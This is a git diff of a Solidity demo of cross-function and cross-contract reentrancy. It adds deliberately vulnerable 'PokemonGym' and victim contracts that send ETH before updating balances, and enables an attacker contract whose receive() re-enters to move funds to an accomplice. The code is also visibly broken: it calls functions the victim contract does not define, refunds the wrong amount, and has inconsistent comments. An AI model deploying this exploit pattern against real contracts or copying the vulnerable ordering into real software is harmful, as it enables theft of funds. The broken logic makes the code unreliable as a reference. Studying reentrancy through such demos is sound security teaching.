@@ -10,7 +10,7 @@ pragma solidity ^0.8.18;
  * with another function that benefits the attacker (transfer)
  *
  * Result: the attacker gets his money back but in the meantime
- * it also assign the balance value to its accomplice
+ * it also assign its balance value to the accomplice
  *
  *
  * @notice type 3 CROSS-CONTRACT REENTRANCY
@@ -73,47 +73,102 @@ contract ReentrancyVictimFunction {
 /**
  * -------------------------------------------------------------------------------------
  * 2. Victim contract Second Cross Attack: Cross Contract
+ *
+ * Vulnerabe shared variables: Pokemon s_pokemonAmount, ETH s_pokemonAmount
  * -------------------------------------------------------------------------------------
  */
-contract OkToken is Ownable {
-    mapping(address => uint256) public balance; // the problematic shared state variable e.g. balances
+
+/**
+ * @notice The PokemonGym is owned by the Victim contract
+ * Vu
+ */
+contract PokemonGym is Ownable {
+    mapping(address => uint256) public s_pokemonAmount;
+
+    error Pokemon_NotEnoughPokemon();
 
     constructor() Ownable(msg.sender) {}
+
+    function transfer(address _to, uint256 _amount) external notEnoughPokemon(_amount) returns (bool) {
+        s_pokemonAmount[msg.sender] -= _amount;
+        s_pokemonAmount[_to] += _amount;
+        return true;
+    }
+
+    function catchOnePokemon(address _owner) external onlyOwner returns (bool) {
+        s_pokemonAmount[_owner] += 1;
+        return true;
+    }
+
+    function releaseAllPokemon(address _owner) external onlyOwner returns (bool) {
+        s_pokemonAmount[_owner] -= s_pokemonAmount[_owner];
+        return true;
+    }
+
+    function balanceOf(address _owner) external returns (uint256) {
+        return s_pokemonAmount[_owner];
+    }
+
+    modifier notEnoughPokemon(uint256 _amount) {
+        if (!(s_pokemonAmount[msg.sender] > _amount)) {
+            revert Pokemon_NotEnoughPokemon();
+        }
+        _;
+    }
 }
 
-// contract ReentrancyVictimContract is ReentrancyGuard {
-//     OkToken oktoken;
-//     uint256 public contractBalance;
-//     uint256 public attackerBalance;
+contract ReentrancyVictimContract is ReentrancyGuard {
+    error ReentrancyVictimContract_notEnoughEthers();
+    error ReentrancyVictimContract_notEnoughPokemon();
 
-//     constructor() {}
+    mapping(address => uint256) public pokemon;
+    PokemonGym pokemonGym;
 
-//     function deposit() external payable {}
+    constructor() {
+        pokemonGym = new PokemonGym();
+    }
 
-//     /* 
-//      * Identical as in ReentrancyVictimFunction, 
-//      * except we call a function (burn) instead of modifying the state (balances)
-//      * 
-//      * The reentrancy guard does not prevent the attack
-//      * Bad use of CEI > burn is after sending tokens (CIE)
-//      */
+    /*
+    * @notice The user buys 1 pokemon for 0.1 ether (mint)
+    */
+    function buyOnePokemon() external payable notEnoughEthers(msg.value) {
+        pokemonGym.catchOnePokemon(msg.sender);
+    }
 
-//     function withdraw() external payable nonReentrant {
-//         uint256 balance = oktoken.balanceOf(msg.sender);
-//         require(balance > 0, "Insufficient balance");
+    /* 
+     * @notice the user gets his money back then the pokemon are released (burn)
+     *
+     * @dev The reentrancy guard does not prevent the attack
+     * Bad use of CEI > burn is after sending tokens (CIE)
+     * 
+     * The receive function in the attacker will trigger the transfer to the accomplice
+     * because the shared variable (s_pokemonAmount) is updated after the sending of ETH
+     * 
+     */
 
-//         //call will fail if no receive function exists in the receiving contract (attacker)
-//         (bool success,) = msg.sender.call{value: balance}("");
-//         require(success, "Failed to send Ether");
+    function sellAllPokemon() external payable nonReentrant notEnoughPokemon {
+        //! call will fail if no receive function exists in the receiving contract (attacker)
+        (bool success,) = msg.sender.call{value: msg.value}("");
+        require(success, "Failed to send back Ether to pokemon owner"); //revert is more gas efficient
 
-//         success = oktoken.burn(msg.sender, balance); // now sender does not have a balance to burn
-//         require(success, "Failed to burn token");
-//     }
+        pokemonGym.releaseAllPokemon(msg.sender);
+    }
 
-//     function getOkToken() public view returns (OkToken) {
-//         return oktoken;
-//     }
-// }
+    modifier notEnoughEthers(uint256 value) {
+        if (value != 0.1 ether) {
+            revert ReentrancyVictimContract_notEnoughEthers();
+        }
+        _;
+    }
+
+    modifier notEnoughPokemon() {
+        if (pokemonGym.balanceOf(msg.sender) == 0) {
+            //vulnerable function
+            revert ReentrancyVictimContract_notEnoughPokemon();
+        }
+        _;
+    }
+}
 
 /**
  * -------------------------------------------------------------------------------------
@@ -123,7 +178,7 @@ contract OkToken is Ownable {
 
 contract ReentrancyAttacker {
     ReentrancyVictimFunction immutable victimFunction;
-    // ReentrancyVictimContract immutable victimContract;
+    ReentrancyVictimContract immutable victimContract;
     address immutable accomplice;
     CrossAttackType currentAttackType;
 
@@ -136,7 +191,7 @@ contract ReentrancyAttacker {
 
     constructor(address _victimFunction, address _victimContract, address _accomplice) {
         victimFunction = ReentrancyVictimFunction(_victimFunction);
-        // victimContract = ReentrancyVictimContract(_victimContract);
+        victimContract = ReentrancyVictimContract(_victimContract);
         accomplice = _accomplice;
     }
 
@@ -147,10 +202,10 @@ contract ReentrancyAttacker {
             victimFunction.deposit{value: msg.value}();
             victimFunction.withdraw(); // calls a receive / fallback
         }
-        // if (attackType == CrossAttackType.CONTRACT) {
-        //     victimContract.deposit{value: msg.value}();
-        //     victimContract.withdraw(); // calls a receive / fallback
-        // }
+        if (attackType == CrossAttackType.CONTRACT) {
+            victimContract.buyOnePokemon{value: msg.value}();
+            victimContract.sellAllPokemon(); // calls a receive / fallback
+        }
     }
 
     receive() external payable {
@@ -160,11 +215,14 @@ contract ReentrancyAttacker {
                 victimFunction.transfer(accomplice, 1 ether);
             }
         }
-        // if (currentAttackType == CrossAttackType.CONTRACT) {
-        //     if (address(victimContract).balance >= msg.value) {
-        //         victimContract.getOkToken().transfer(accomplice, 1 ether); // this
-        //     }
-        // }
+        if (currentAttackType == CrossAttackType.CONTRACT) {
+            if (address(victimContract).balance >= msg.value) {
+                victimContract.transfer(accomplice, 1 ether); // 
+            }
+        }
     }
 
+    function getOkTokenBalance(address _user) public view returns (uint256) {
+        return victimContract.getOkToken().balanceOf(_user);
+    }
 }
